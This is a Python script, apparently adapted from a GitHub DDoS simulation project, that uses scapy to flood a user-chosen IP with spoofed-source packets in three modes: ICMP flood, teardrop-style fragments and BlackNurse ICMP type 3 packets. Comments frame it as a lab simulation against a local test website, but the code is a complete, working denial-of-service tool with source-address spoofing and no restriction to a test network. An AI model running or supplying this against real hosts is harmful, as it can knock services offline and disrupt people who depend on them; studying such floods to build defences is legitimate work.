# Adapted from @ricardojoserf's ddos_simulation on GitHub
# For use with a separate system connected to the same network as the running instance of the test website. Tested using a Raspberry Pi 4B+ running Raspbian on the same network.
# Add IPs to simulate attackers to ips.txt
# CAUTION: Ensure generated are not IP addresses for legitimate devices on the network including the IP of the system conducting this simulation.

import sys, random
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import scapy
from scapy.all import *
import multiprocessing, time
from six.moves import input as raw_input

# User inputs
dst_ip = raw_input("IP to attack: ")
n_ips = raw_input("\nNumber of IPs to attack from: ")
n_msg = raw_input("\nNumber of messages per IP for attackers: ")
interface = raw_input('\nInterface: \nwlan0) Wireless LAN card 0 \neth0) Ethernet port 0 \nlo) Local interface \nYour choice: ')
type = raw_input("\nSelect attack type: \n1) Flood \n2) Teardrop \n3) Black nurse \nYour choice: ")
orig_type = raw_input("\nSelect origin of attacker IPs: \n1) From ips.txt \n2) Random \nYour choice: ")
threads = 3

ips = []

def get_random_ips(n):
	for i in range(0,int(n)):
		ip_gen = str(random.randint(0,255)) + "." +str(random.randint(0,255)) + "." +str(random.randint(0,255)) + "." +str(random.randint(0,255))
		ips.append(ip_gen)

def get_text_total_ips():
	f_ips = []
	for line in open("ips.txt"):
		f_ips.append(line.replace('\n',''))
	if len(f_ips) <= 1:
		print("[-] Error: You chose to load IP addresses from ips.txt but the file is empty")
		sys.exit(0)
	for n in range ( 0, int( int(n_ips) / len(f_ips) ) ):
		for ip in f_ips:
			ips.append(ip)
	for j in range ( 0, int( int(n_ips) % len(f_ips) ) ):
		ips.append(f_ips[j])

load = "suchaload"*162
def sendPacketFlood(origin_ip):
	send((IP(dst=dst_ip,src=origin_ip)/ICMP()/load)*int(n_msg), iface=interface, verbose=False)

def sendPacketMF(origin_ip):
	send((IP(dst=dst_ip, src=origin_ip, flags="MF", proto = 17, frag = 0)/ICMP()/load)*int(n_msg), iface=interface, verbose=False)

def sendPacketT3(origin_ip):
	send((IP(dst=dst_ip,src=origin_ip)/ICMP(type=3, code=3))*int(n_msg), iface=interface, verbose=False)


if orig_type == "2":
	get_random_ips(n_ips)
else:
	get_text_total_ips()


# With threading
t0 = time.time()

p = multiprocessing.Pool(threads)
if type == "1":
	p.map(func=sendPacketFlood,iterable=ips) 
elif type == "2":
	p.map(func=sendPacketMF,iterable=ips) 
elif type == "3":
	p.map(func=sendPacketT3,iterable=ips) 
else:
	print("Type unknown")
p.close()

total_s = float(time.time() - t0)
total_p = int(n_ips) * int(n_msg)
ratio = float(total_p)/float(total_s)

print ("\nTotal: \nTime to send:\t%d seconds" % (total_s))
print ("Packets sent:\t%d \nSpeed:\t%d p/s" % (total_p, ratio))
